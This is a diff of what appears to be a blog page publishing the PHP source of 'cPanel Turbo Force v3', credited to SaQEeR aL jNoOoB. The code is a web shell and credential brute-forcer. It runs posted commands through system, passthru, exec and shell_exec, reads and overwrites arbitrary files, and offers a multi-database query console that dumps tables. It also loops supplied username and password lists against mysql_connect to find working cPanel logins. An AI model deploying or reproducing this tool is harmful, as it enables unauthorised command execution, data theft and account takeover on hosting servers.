@@ -15,11 +15,11 @@ cPanel Turbo Force v3 &#8211; Coded By SaQEeR aL jNoOoB
 
 ### cPanel Turbo Force v3 Source Code
 
-{% highlight php linenos %}&lt;html&gt;
+{% highlight php linenos %}<html>
 
-&lt;head&gt;
-&lt;title&gt;cPanel Turbo Force v3&lt;/title&gt;
-&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
+<head>
+<title>cPanel Turbo Force v3</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <?php
 /*
 Turbo Force V3 By SaQEeR aL jNoOoB
@@ -28,10 +28,10 @@ Turbo Force V3 By SaQEeR aL jNoOoB
 @error_reporting(0);
 
 
-echo '&lt;head&gt;
+echo '<head>
 
-&lt;style type="text/css"&gt;
-&lt;!--
+<style type="text/css">
+<!--
 body {
 	background-color: #000000;
     font-size: 18px;
@@ -75,141 +75,141 @@ a:hover {
 .style3 {
 	color: #FFFFFF;
 }
---&gt;
-&lt;/style&gt;
+-->
+</style>
 
-&lt;/head&gt;
+</head>
 ';
 
 
 function in($type,$name,$size,$value,$checked=0) 
  {
- $ret = "&lt;input type=".$type." name=".$name." "; if($size != 0) 
+ $ret = "<input type=".$type." name=".$name." "; if($size != 0) 
  {
  $ret .= "size=".$size." "; }
- $ret .= "value=\"".$value."\""; if($checked) $ret .= " checked"; return $ret."&gt;"; }
+ $ret .= "value=\"".$value."\""; if($checked) $ret .= " checked"; return $ret.">"; }
  
 class my_sql 
  {
  var $host = 'localhost'; var $port = ''; var $user = ''; var $pass = ''; var $base = ''; var $db = ''; var $connection; var $res; var $error; var $rows; var $columns; var $num_rows; var $num_fields; var $dump; function connect() 
  {
- switch($this-&gt;db) 
+ switch($this->db) 
  {
- case 'MySQL': if(empty($this-&gt;port)) 
+ case 'MySQL': if(empty($this->port)) 
  {
- $this-&gt;port = '3306'; }
- if(!function_exists('mysql_connect')) return 0; $this-&gt;connection = @mysql_connect($this-&gt;host.':'.$this-&gt;port,$this-&gt;user,$this-&gt;pass); if(is_resource($this-&gt;connection)) return 1; $this-&gt;error = @mysql_errno()." : ".@mysql_error(); break; case 'MSSQL': if(empty($this-&gt;port)) 
+ $this->port = '3306'; }
+ if(!function_exists('mysql_connect')) return 0; $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass); if(is_resource($this->connection)) return 1; $this->error = @mysql_errno()." : ".@mysql_error(); break; case 'MSSQL': if(empty($this->port)) 
  {
- $this-&gt;port = '1433'; }
- if(!function_exists('mssql_connect')) return 0; $this-&gt;connection = @mssql_connect($this-&gt;host.','.$this-&gt;port,$this-&gt;user,$this-&gt;pass); if($this-&gt;connection) return 1; $this-&gt;error = "Can't connect to server"; break; case 'PostgreSQL': if(empty($this-&gt;port)) 
+ $this->port = '1433'; }
+ if(!function_exists('mssql_connect')) return 0; $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass); if($this->connection) return 1; $this->error = "Can't connect to server"; break; case 'PostgreSQL': if(empty($this->port)) 
  {
- $this-&gt;port = '5432'; }
- $str = "host='".$this-&gt;host."' port='".$this-&gt;port."' user='".$this-&gt;user."' password='".$this-&gt;pass."' dbname='".$this-&gt;base."'"; if(!function_exists('pg_connect')) return 0; $this-&gt;connection = @pg_connect($str); if(is_resource($this-&gt;connection)) return 1; $this-&gt;error = @pg_last_error($this-&gt;connection); break; case 'Oracle': if(!function_exists('ocilogon')) return 0; $this-&gt;connection = @ocilogon($this-&gt;user, $this-&gt;pass, $this-&gt;base); if(is_resource($this-&gt;connection)) return 1; $error = @ocierror(); $this-&gt;error=$error['message']; break; }
+ $this->port = '5432'; }
+ $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'"; if(!function_exists('pg_connect')) return 0; $this->connection = @pg_connect($str); if(is_resource($this->connection)) return 1; $this->error = @pg_last_error($this->connection); break; case 'Oracle': if(!function_exists('ocilogon')) return 0; $this->connection = @ocilogon($this->user, $this->pass, $this->base); if(is_resource($this->connection)) return 1; $error = @ocierror(); $this->error=$error['message']; break; }
  return 0; }
  function select_db() 
  {
- switch($this-&gt;db) 
+ switch($this->db) 
  {
- case 'MySQL': if(@mysql_select_db($this-&gt;base,$this-&gt;connection)) return 1; $this-&gt;error = @mysql_errno()." : ".@mysql_error(); break; case 'MSSQL': if(@mssql_select_db($this-&gt;base,$this-&gt;connection)) return 1; $this-&gt;error = "Can't select database"; break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; }
+ case 'MySQL': if(@mysql_select_db($this->base,$this->connection)) return 1; $this->error = @mysql_errno()." : ".@mysql_error(); break; case 'MSSQL': if(@mssql_select_db($this->base,$this->connection)) return 1; $this->error = "Can't select database"; break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; }
  return 0; }
  function query($query) 
  {
- $this-&gt;res=$this-&gt;error=''; switch($this-&gt;db) 
+ $this->res=$this->error=''; switch($this->db) 
  {
- case 'MySQL': if(false===($this-&gt;res=@mysql_query('/*'.chr(0).'*/'.$query,$this-&gt;connection))) 
+ case 'MySQL': if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection))) 
  {
- $this-&gt;error = @mysql_error($this-&gt;connection); return 0; }
- else if(is_resource($this-&gt;res)) 
- {
- return 1; }
- return 2; break; case 'MSSQL': if(false===($this-&gt;res=@mssql_query($query,$this-&gt;connection))) 
- {
- $this-&gt;error = 'Query error'; return 0; }
- else if(@mssql_num_rows($this-&gt;res) &gt; 0) 
+ $this->error = @mysql_error($this->connection); return 0; }
+ else if(is_resource($this->res)) 
  {
  return 1; }
- return 2; break; case 'PostgreSQL': if(false===($this-&gt;res=@pg_query($this-&gt;connection,$query))) 
+ return 2; break; case 'MSSQL': if(false===($this->res=@mssql_query($query,$this->connection))) 
  {
- $this-&gt;error = @pg_last_error($this-&gt;connection); return 0; }
- else if(@pg_num_rows($this-&gt;res) &gt; 0) 
+ $this->error = 'Query error'; return 0; }
+ else if(@mssql_num_rows($this->res) > 0) 
  {
  return 1; }
- return 2; break; case 'Oracle': if(false===($this-&gt;res=@ociparse($this-&gt;connection,$query))) 
+ return 2; break; case 'PostgreSQL': if(false===($this->res=@pg_query($this->connection,$query))) 
  {
- $this-&gt;error = 'Query parse error'; }
+ $this->error = @pg_last_error($this->connection); return 0; }
+ else if(@pg_num_rows($this->res) > 0) 
+ {
+ return 1; }
+ return 2; break; case 'Oracle': if(false===($this->res=@ociparse($this->connection,$query))) 
+ {
+ $this->error = 'Query parse error'; }
  else 
  {
- if(@ociexecute($this-&gt;res)) 
+ if(@ociexecute($this->res)) 
  {
- if(@ocirowcount($this-&gt;res) != 0) return 2; return 1; }
- $error = @ocierror(); $this-&gt;error=$error['message']; }
+ if(@ocirowcount($this->res) != 0) return 2; return 1; }
+ $error = @ocierror(); $this->error=$error['message']; }
  break; }
  return 0; }
  function get_result() 
  {
- $this-&gt;rows=array(); $this-&gt;columns=array(); $this-&gt;num_rows=$this-&gt;num_fields=0; switch($this-&gt;db) 
+ $this->rows=array(); $this->columns=array(); $this->num_rows=$this->num_fields=0; switch($this->db) 
  {
- case 'MySQL': $this-&gt;num_rows=@mysql_num_rows($this-&gt;res); $this-&gt;num_fields=@mysql_num_fields($this-&gt;res); while(false !== ($this-&gt;rows[] = @mysql_fetch_assoc($this-&gt;res))); @mysql_free_result($this-&gt;res); if($this-&gt;num_rows)
+ case 'MySQL': $this->num_rows=@mysql_num_rows($this->res); $this->num_fields=@mysql_num_fields($this->res); while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res))); @mysql_free_result($this->res); if($this->num_rows)
  {
-$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
- break; case 'MSSQL': $this-&gt;num_rows=@mssql_num_rows($this-&gt;res); $this-&gt;num_fields=@mssql_num_fields($this-&gt;res); while(false !== ($this-&gt;rows[] = @mssql_fetch_assoc($this-&gt;res))); @mssql_free_result($this-&gt;res); if($this-&gt;num_rows)
+$this->columns = @array_keys($this->rows[0]); return 1;}
+ break; case 'MSSQL': $this->num_rows=@mssql_num_rows($this->res); $this->num_fields=@mssql_num_fields($this->res); while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res))); @mssql_free_result($this->res); if($this->num_rows)
  {
-$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
-; break; case 'PostgreSQL': $this-&gt;num_rows=@pg_num_rows($this-&gt;res); $this-&gt;num_fields=@pg_num_fields($this-&gt;res); while(false !== ($this-&gt;rows[] = @pg_fetch_assoc($this-&gt;res))); @pg_free_result($this-&gt;res); if($this-&gt;num_rows)
+$this->columns = @array_keys($this->rows[0]); return 1;}
+; break; case 'PostgreSQL': $this->num_rows=@pg_num_rows($this->res); $this->num_fields=@pg_num_fields($this->res); while(false !== ($this->rows[] = @pg_fetch_assoc($this->res))); @pg_free_result($this->res); if($this->num_rows)
  {
-$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
- break; case 'Oracle': $this-&gt;num_fields=@ocinumcols($this-&gt;res); while(false !== ($this-&gt;rows[] = @oci_fetch_assoc($this-&gt;res))) $this-&gt;num_rows++; @ocifreestatement($this-&gt;res); if($this-&gt;num_rows)
+$this->columns = @array_keys($this->rows[0]); return 1;}
+ break; case 'Oracle': $this->num_fields=@ocinumcols($this->res); while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++; @ocifreestatement($this->res); if($this->num_rows)
  {
-$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
+$this->columns = @array_keys($this->rows[0]); return 1;}
  break; }
  return 0; }
  function dump($table) 
  {
- if(empty($table)) return 0; $this-&gt;dump=array(); $this-&gt;dump[0] = '
-###'; $this-&gt;dump[1] = '
-### --------------------------------------- '; $this-&gt;dump[2] = '
-###  Created: '.date ("d/m/Y H:i:s"); $this-&gt;dump[3] = '
-### Database: '.$this-&gt;base; $this-&gt;dump[4] = '
-###    Table: '.$table; $this-&gt;dump[5] = '
-### --------------------------------------- '; switch($this-&gt;db) 
+ if(empty($table)) return 0; $this->dump=array(); $this->dump[0] = '
+###'; $this->dump[1] = '
+### --------------------------------------- '; $this->dump[2] = '
+###  Created: '.date ("d/m/Y H:i:s"); $this->dump[3] = '
+### Database: '.$this->base; $this->dump[4] = '
+###    Table: '.$table; $this->dump[5] = '
+### --------------------------------------- '; switch($this->db) 
  {
- case 'MySQL': $this-&gt;dump[0] = '
-### MySQL dump'; if($this-&gt;query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this-&gt;get_result()) return 0; $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'].";"; $this-&gt;dump[] = '
-### --------------------------------------- '; if($this-&gt;query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
+ case 'MySQL': $this->dump[0] = '
+### MySQL dump'; if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; $this->dump[] = $this->rows[0]['Create Table'].";"; $this->dump[] = '
+### --------------------------------------- '; if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++) 
  {
- foreach($this-&gt;rows[$i] as $k=&gt;$v) 
+ foreach($this->rows[$i] as $k=>$v) 
  {
-$this-&gt;rows[$i][$k] = @mysql_real_escape_string($v);}
- $this-&gt;dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this-&gt;columns).'`) VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');'; }
- break; case 'MSSQL': $this-&gt;dump[0] = '
-### MSSQL dump'; if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
+$this->rows[$i][$k] = @mysql_real_escape_string($v);}
+ $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
+ break; case 'MSSQL': $this->dump[0] = '
+### MSSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++) 
  {
- foreach($this-&gt;rows[$i] as $k=&gt;$v) 
+ foreach($this->rows[$i] as $k=>$v) 
  {
-$this-&gt;rows[$i][$k] = @addslashes($v);}
- $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');'; }
- break; case 'PostgreSQL': $this-&gt;dump[0] = '
-### PostgreSQL dump'; if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
+$this->rows[$i][$k] = @addslashes($v);}
+ $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
+ break; case 'PostgreSQL': $this->dump[0] = '
+### PostgreSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++) 
  {
- foreach($this-&gt;rows[$i] as $k=&gt;$v) 
+ foreach($this->rows[$i] as $k=>$v) 
  {
-$this-&gt;rows[$i][$k] = @addslashes($v);}
- $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');'; }
- break; case 'Oracle': $this-&gt;dump[0] = '
-### ORACLE dump'; $this-&gt;dump[] = '
+$this->rows[$i][$k] = @addslashes($v);}
+ $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
+ break; case 'Oracle': $this->dump[0] = '
+### ORACLE dump'; $this->dump[] = '
 ### under construction'; break; default: return 0; break; }
  return 1; }
  function close() 
  {
- switch($this-&gt;db) 
+ switch($this->db) 
  {
- case 'MySQL': @mysql_close($this-&gt;connection); break; case 'MSSQL': @mssql_close($this-&gt;connection); break; case 'PostgreSQL': @pg_close($this-&gt;connection); break; case 'Oracle': @oci_close($this-&gt;connection); break; }
+ case 'MySQL': @mysql_close($this->connection); break; case 'MSSQL': @mssql_close($this->connection); break; case 'PostgreSQL': @pg_close($this->connection); break; case 'Oracle': @oci_close($this->connection); break; }
  }
  function affected_rows() 
  {
- switch($this-&gt;db) 
+ switch($this->db) 
  {
- case 'MySQL': return @mysql_affected_rows($this-&gt;res); break; case 'MSSQL': return @mssql_affected_rows($this-&gt;res); break; case 'PostgreSQL': return @pg_affected_rows($this-&gt;res); break; case 'Oracle': return @ocirowcount($this-&gt;res); break; default: return 0; break; }
+ case 'MySQL': return @mysql_affected_rows($this->res); break; case 'MSSQL': return @mssql_affected_rows($this->res); break; case 'PostgreSQL': return @pg_affected_rows($this->res); break; case 'Oracle': return @ocirowcount($this->res); break; default: return 0; break; }
  }
  }
  if(!empty($_POST['cccc']) && $_POST['cccc']=="download_file" && !empty($_POST['d_name'])) 
@@ -226,33 +226,33 @@ $this-&gt;rows[$i][$k] = @addslashes($v);}
  }
  if(isset($_GET['phpinfo'])) 
  {
- echo @phpinfo(); echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die(); }
+ echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
  if (!empty($_POST['cccc']) && $_POST['cccc']=="db_query") 
  {
- echo $head; $sql = new my_sql(); $sql-&gt;db = $_POST['db']; $sql-&gt;host = $_POST['db_server']; $sql-&gt;port = $_POST['db_port']; $sql-&gt;user = $_POST['mysql_l']; $sql-&gt;pass = $_POST['mysql_p']; $sql-&gt;base = $_POST['mysql_db']; $querys = @explode(';',$_POST['db_query']); echo '&lt;body bgcolor=#e4e0d8&gt;'; if(!$sql-&gt;connect()) echo "&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=red&gt;&lt;b&gt;".$sql-&gt;error."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; else 
+ echo $head; $sql = new my_sql(); $sql->db = $_POST['db']; $sql->host = $_POST['db_server']; $sql->port = $_POST['db_port']; $sql->user = $_POST['mysql_l']; $sql->pass = $_POST['mysql_p']; $sql->base = $_POST['mysql_db']; $querys = @explode(';',$_POST['db_query']); echo '<body bgcolor=#e4e0d8>'; if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else 
  {
- if(!empty($sql-&gt;base)&&!$sql-&gt;select_db()) echo "&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=red&gt;&lt;b&gt;".$sql-&gt;error."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; else 
+ if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else 
  {
- foreach($querys as $num=&gt;$query) 
+ foreach($querys as $num=>$query) 
  {
- if(strlen($query)&gt;5) 
+ if(strlen($query)>5) 
  {
- echo "&lt;font face=Verdana size=-2 color=green&gt;&lt;b&gt;Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."&lt;/b&gt;&lt;/font&gt;&lt;br&gt;"; switch($sql-&gt;query($query)) 
+ echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>"; switch($sql->query($query)) 
  {
- case '0': echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;Error : &lt;b&gt;".$sql-&gt;error."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"; break; case '1': if($sql-&gt;get_result()) 
+ case '0': echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>"; break; case '1': if($sql->get_result()) 
  {
- echo "&lt;table width=100%&gt;"; foreach($sql-&gt;columns as $k=&gt;$v) $sql-&gt;columns[$k] = htmlspecialchars($v,ENT_QUOTES); $keys = @implode("&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#800000&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&nbsp;", $sql-&gt;columns); echo "&lt;tr&gt;&lt;td bgcolor=#800000&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&nbsp;".$keys."&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;"; for($i=0;$i&lt;$sql-&gt;num_rows;$i++) 
+ echo "<table width=100%>"; foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES); $keys = @implode("&nbsp;</b></font></td><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;", $sql->columns); echo "<tr><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>"; for($i=0;$i<$sql->num_rows;$i++) 
  {
- foreach($sql-&gt;rows[$i] as $k=&gt;$v) $sql-&gt;rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES); $values = @implode("&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&nbsp;",$sql-&gt;rows[$i]); echo '&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&nbsp;'.$values.'&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;'; }
- echo "&lt;/table&gt;"; }
- break; case '2': $ar = $sql-&gt;affected_rows()?($sql-&gt;affected_rows()):('0'); echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;affected rows : &lt;b&gt;".$ar."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;"; break; }
+ foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES); $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]); echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>'; }
+ echo "</table>"; }
+ break; case '2': $ar = $sql->affected_rows()?($sql->affected_rows()):('0'); echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>"; break; }
  }
  }
  }
  }
- echo "&lt;br&gt;&lt;title&gt;Turbo Force By Tryag&lt;/title&gt;&lt;form name=form method=POST&gt;"; 
+ echo "<br><title>Turbo Force By Tryag</title><form name=form method=POST>"; 
  echo in('hidden','db',0,$_POST['db']); echo in('hidden','db_server',0,$_POST['db_server']); echo in('hidden','db_port',0,$_POST['db_port']); echo in('hidden','mysql_l',0,$_POST['mysql_l']); echo in('hidden','mysql_p',0,$_POST['mysql_p']); echo in('hidden','mysql_db',0,$_POST['mysql_db']); echo in('hidden','cccc',0,'db_query'); 
- echo "&lt;div align=center&gt;"; echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;Base: &lt;/b&gt;&lt;input type=text name=mysql_db value=\"".$sql-&gt;base."\"&gt;&lt;/font&gt;&lt;br&gt;"; echo "&lt;textarea cols=65 rows=10 name=db_query&gt;".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."&lt;/textarea&gt;&lt;br&gt;&lt;input type=submit name=submit value=\" Run SQL query \"&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;"; echo "&lt;/form&gt;"; echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die(); }
+ echo "<div align=center>"; echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysql_db value=\"".$sql->base."\"></font><br>"; echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; echo "</form>"; echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
 
 
 
@@ -280,48 +280,48 @@ function ccmmdd($ccmmdd2,$att)
 {
 global $ccmmdd2,$att;
 echo '
-&lt;table style="width: 100%" class="style1" dir="rtl"&gt;
-	&lt;tr&gt;
-		&lt;td class="style9"&gt;&lt;strong&gt;���� ������&lt;/strong&gt;&lt;/td&gt;
-	&lt;/tr&gt;
-	&lt;tr&gt;
-		&lt;td class="style13"&gt;
-				&lt;form method="post"&gt;
-					&lt;select name="att" dir="rtl" style="height: 109px" size="6"&gt;
+<table style="width: 100%" class="style1" dir="rtl">
+	<tr>
+		<td class="style9"><strong>���� ������</strong></td>
+	</tr>
+	<tr>
+		<td class="style13">
+				<form method="post">
+					<select name="att" dir="rtl" style="height: 109px" size="6">
 ';
 if($_POST['att']==null)
 {
-echo '						&lt;option value="system" selected=""&gt;system&lt;/option&gt;';
+echo '						<option value="system" selected="">system</option>';
 }else{
-echo "						&lt;option value='$_POST[att]' selected=''&gt;$_POST[att]&lt;/option&gt;
-						&lt;option value=system&gt;system&lt;/option&gt;
+echo "						<option value='$_POST[att]' selected=''>$_POST[att]</option>
+						<option value=system>system</option>
 ";
 
 						
 }
 
 echo '
-						&lt;option value="passthru"&gt;passthru&lt;/option&gt;
-						&lt;option value="exec"&gt;exec&lt;/option&gt;
-						&lt;option value="shell_exec"&gt;shell_exec&lt;/option&gt;	
-					&lt;/select&gt;
-						&lt;input name="page" value="ccmmdd" type="hidden"&gt;&lt;br&gt;
-						&lt;input dir="ltr" name="ccmmdd2" style="width: 173px" type="text" value="';if(!$_POST['ccmmdd2']){echo 'dir';}else{echo $_POST['ccmmdd2'];}echo '"&gt;&lt;br&gt;
-						&lt;input type="submit" value="�����"&gt;
-				&lt;/form&gt;
+						<option value="passthru">passthru</option>
+						<option value="exec">exec</option>
+						<option value="shell_exec">shell_exec</option>	
+					</select>
+						<input name="page" value="ccmmdd" type="hidden"><br>
+						<input dir="ltr" name="ccmmdd2" style="width: 173px" type="text" value="';if(!$_POST['ccmmdd2']){echo 'dir';}else{echo $_POST['ccmmdd2'];}echo '"><br>
+						<input type="submit" value="�����">
+				</form>
 		
-		&lt;/td&gt;
-	&lt;/tr&gt;
-	&lt;tr&gt;
-		&lt;td class="style13"&gt;
+		</td>
+	</tr>
+	<tr>
+		<td class="style13">
 ';
 
 		if($_POST[att]=='system')
 		{
 echo '
-					&lt;textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px"&gt;';
+					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
 					system($_POST['ccmmdd2']);
-echo '					&lt;/textarea&gt;';
+echo '					</textarea>';
 
 
 		}
@@ -329,9 +329,9 @@ echo '					&lt;/textarea&gt;';
 		if($_POST[att]=='passthru')
 		{
 echo '
-					&lt;textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px"&gt;';
+					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
 					passthru($_POST['ccmmdd2']);
-echo '					&lt;/textarea&gt;';
+echo '					</textarea>';
 
 
 		}
@@ -343,10 +343,10 @@ echo '					&lt;/textarea&gt;';
 		if($_POST[att]=='exec')
 		{
 
-echo '					&lt;textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px"&gt;';
+echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
 					exec($_POST['ccmmdd2'],$res);
 				echo $res = join("\n",$res); 				
-echo '					&lt;/textarea&gt;';
+echo '					</textarea>';
 
 
 		}
@@ -360,16 +360,16 @@ echo '					&lt;/textarea&gt;';
 		if($_POST[att]=='shell_exec')
 		{
 
-echo '					&lt;textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px"&gt;';
+echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
 				echo	shell_exec($_POST['ccmmdd2']);
-echo '					&lt;/textarea&gt;';
+echo '					</textarea>';
 
 
 		}
 echo '		
-		&lt;/td&gt;
-	&lt;/tr&gt;
-&lt;/table&gt;
+		</td>
+	</tr>
+</table>
 ';
 
 exit;
@@ -383,7 +383,7 @@ $code=@str_replace('\\','',$code);
 $fp = fopen($pathclass, 'w');
 fwrite($fp,"$code");
 fclose($fp);
-echo "&lt;center&gt;&lt;b&gt;OK Edit&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt;";
+echo "<center><b>OK Edit<br><br><br><br><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
 exit;
 }	
 
@@ -397,20 +397,20 @@ exit;
 	{
 	$pathclass =$_POST['pathclass'];
 echo '
-&lt;form method="POST"&gt;
-&lt;input type="hidden" name="page" value="edit"&gt;
+<form method="POST">
+<input type="hidden" name="page" value="edit">
 ';
 	
 	$sahacker = fopen($pathclass, "rb");
-echo '&lt;center&gt;'.$pathclass.'&lt;br&gt;&lt;textarea dir="ltr" name="code" style="width: 845px; height: 404px"&gt;';	
+echo '<center>'.$pathclass.'<br><textarea dir="ltr" name="code" style="width: 845px; height: 404px">';	
 $code = fread($sahacker, filesize($pathclass));
 echo $code =htmlspecialchars($code);
-echo '&lt;/textarea&gt;';	
+echo '</textarea>';	
 	fclose($sahacker);
 echo '
-&lt;br&gt;&lt;input type="text" name="pathclass" value="'.$pathclass.'" style="width: 445px;"&gt;
-&lt;br&gt;&lt;strong&gt;&lt;input type="submit" value="edit file"&gt;
-&lt;/form&gt;
+<br><input type="text" name="pathclass" value="'.$pathclass.'" style="width: 445px;">
+<br><strong><input type="submit" value="edit file">
+</form>
 ';
 		exit;
 	}
@@ -469,19 +469,19 @@ if(isset($_POST['usernames']) && isset($_POST['passwords']))
         if($user !== '')
         {
         $user=trim($user);
-         for($i=0;$i&lt;=$id2;$i++)
+         for($i=0;$i<=$id2;$i++)
          {
             $pass = trim($a2[$i]);
             if(@mysql_connect('localhost',$user,$pass))
             {
-                echo "SaQEeR~ username is ===&gt; (&lt;b&gt;&lt;font color=green&gt;$user&lt;/font&gt;&lt;/b&gt;) Password is ===&gt; (&lt;b&gt;&lt;font color=green&gt;$pass&lt;/font&gt;&lt;/b&gt;)&lt;br /&gt;";
+                echo "SaQEeR~ username is ===> (<b><font color=green>$user</font></b>) Password is ===> (<b><font color=green>$pass</font></b>)<br />";
                 $ok++;
             }
          }
         }
     }
-    echo "&lt;hr&gt;&lt;b&gt;You Found &lt;font color=green&gt;$ok&lt;/font&gt; Cpanel By SaQEeR aL jNoOoB Script Name&lt;/b&gt;";
-    echo "&lt;center&gt;&lt;b&gt;&lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt;";
+    echo "<hr><b>You Found <font color=green>$ok</font> Cpanel By SaQEeR aL jNoOoB Script Name</b>";
+    echo "<center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
     exit;
 }
 }
